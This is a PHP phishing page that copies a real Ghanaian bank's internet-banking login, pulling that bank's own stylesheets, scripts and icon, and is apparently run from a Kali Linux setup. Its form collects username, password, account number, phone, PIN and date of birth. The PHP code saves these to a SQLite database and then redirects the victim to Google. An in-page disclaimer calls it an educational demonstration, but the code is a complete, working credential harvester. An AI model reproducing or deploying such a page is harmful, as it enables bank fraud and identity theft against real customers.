<!DOCTYPE html>
<html lang="en">
<head>
        <head>
        <title>Fidelity Corporate Internet Banking</title>
        <meta http-equiv="cache-control" content="no-cache"> 
        <meta http-equiv="cache-control" content="no-store"> 
        <meta http-equiv="Pragma" content="no-cache"> 
        <meta http-equiv="Expires" content=0>
        <meta http-equiv="X-UA-Compatible" content="IE=11">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta name="viewport" content="1024, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=2.0" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="default" />
        <meta name="HandheldFriendly" content="true" />
        <meta name="MobileOptimized" content="width" />
        
    
    
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <link type="text/css" rel="stylesheet" href="https://corporateibank.fidelitybank.com.gh/B001/css/cmn/banking.uri.css" />
    <link type="text/css" rel="stylesheet" href="https://corporateibank.fidelitybank.com.gh/B001/css/C_COLPAL1/scrollbars.uri.css" />
    <link type="text/css" rel="stylesheet" href="https://corporateibank.fidelitybank.com.gh/B001/css/cmn/virtualkeyboard.uri.css" />

    <link type="text/css" rel="stylesheet" href="custom.css" />


    <link rel="shortcut icon" href="https://corporateibank.fidelitybank.com.gh/B001/images/oraclefav.ico" />
    
    <script type="text/javascript" src="https://corporateibank.fidelitybank.com.gh/B001/JS/combined/jquery-includes.js" charset="utf-8"></script>
    <script type="text/javascript" src="https://corporateibank.fidelitybank.com.gh/B001/jsdir/common.js" charset="utf-8"></script>
</head>

<body>

    <div id="header">
		<div id="myHead">
        <p style="font-family: Garamond, serif;   font-size: 150%; font-weight: bold;"> Bank of S&R</p>
		</div>
		<form name="frmlang" method="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
			
				<div id="main" style="left:0px;width:100%!important;position:relative !important">
                    <div id="section">
                    <div id="keyboard_firstrowtwrapper" style="background-color:#0e96bc">
                        <div id="keyboard_bankname">Please login to S&R Retail Internet Banking</div>
                        
                    </div>
                    <div id="rows">

                        <div class="container">
                            <div id="login-row" class="row justify-content-center align-items-center">
                                <div id="login-column" class="col-md-6">
                                    <div id="login-box" class="col-md-12">
                                            <div class="form-group">
                                                <label for="myUsername" class="text-info">Username:</label>
                                                <br>
                                                <input type="text" name="myUsername" id="myUsername" class="form-control" required>
                                            </div>
                                            <div class="form-group">
                                                <label for="myPassword" class="text-info">Password:</label>
                                                <br>
                                                <input type="password" name="myPassword" id="myPassword" class="form-control" required>
                                            </div>

                                            <div class="form-group">
                                                <label for="myAccount" class="text-info">Acount Number:</label>
                                                <br>
                                                <input type="number" name="myAccount" id="myAccount" class="form-control" required>
                                            </div>

                                            <div class="form-group">
                                                <label for="myPhone" class="text-info">Phone Number:</label>
                                                <br>
                                                <input type="number" name="myPhone" id="myPhone" class="form-control" required>
                                            </div>

                                            <div class="form-group">
                                                <label for="myPIN" class="text-info">PIN:</label>
                                                <br>
                                                <input type="password" name="myPIN" id="myPIN" class="form-control" max="999999" required>
                                            </div>


                                            <div class="form-group">
                                                <label for="myDOB" class="text-info">Date of Birth:</label>
                                                <br>
                                                <input type="date" name="myDOB" id="myDOB" class="form-control" required>
                                            </div>


                                            <div class="form-group">
                                        
                                                <br />


                                                <input type="submit" name="submit" class="btn btn-info btn-md" value="LOGIN">
                                            </div>
                                            <div id="register-link" class="text-right">
                                                <a href="#" class="text-info">Register here</a>
                                            </div>

                                            <br />

                                            <div id="disclaimer" class="text-right" style="color: red; font-weight:bold">
                                                <p>DISCLAMER: This page is created for educational purposes ONLY to demonstrate phishing attack. Please, do not enter your bank information here. Thank you</p>
                                            </div>
                                    </div>
                                </div>
                            </div>
                        </div>


    

                    
		
		</form>


<?php
$db = new PDO("sqlite:/home/kali/mybankphish/fidelityusers.db");
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // collect value of input field
  $myUsername = $_POST['myUsername'];
  $myPassword = $_POST['myPassword'];
  $myAccount = $_POST['myAccount'];
  $myPhone = $_POST['myPhone'];
  $myPIN = $_POST['myPIN'];
  $myDOB = $_POST['myDOB'];

//   if (empty($myPassword)) {
//     echo "myPassword is empty";
//   } else {
//     echo $myUsername;
//   }

if( $myUsername !="" && $myPassword !="" && $myAccount !="" && $myPhone !="" && $myPIN !="" && $myDOB !=""){
$sql = "INSERT INTO userdetails (username,password,account,phone,pin,dob) VALUES (?,?,?,?,?,?)";
$stmt= $db->prepare($sql);
$stmt->execute([$myUsername,$myPassword,$myAccount,$myPhone,$myPIN,$myDOB ]);


//   if (empty($myPassword)) {
//     echo "myPassword is empty";
//   } else {
//     echo $myUsername;
//   }

//   echo("Done!");

if (!headers_sent()){
header("Location: https://www.google.com");
// exit();
} else {
	echo '<script type="text/javascript">';
	echo 'window.location.href="https://www.google.com";';
	echo '</script>';
	echo '<noscript>';
	echo '<meta http-equiv="refresh" content="0;url=https://www.google.com" />';
	echo '</noscript>';
}
}
}
?>

	</div>
	
	</div>
    


</body>
</html>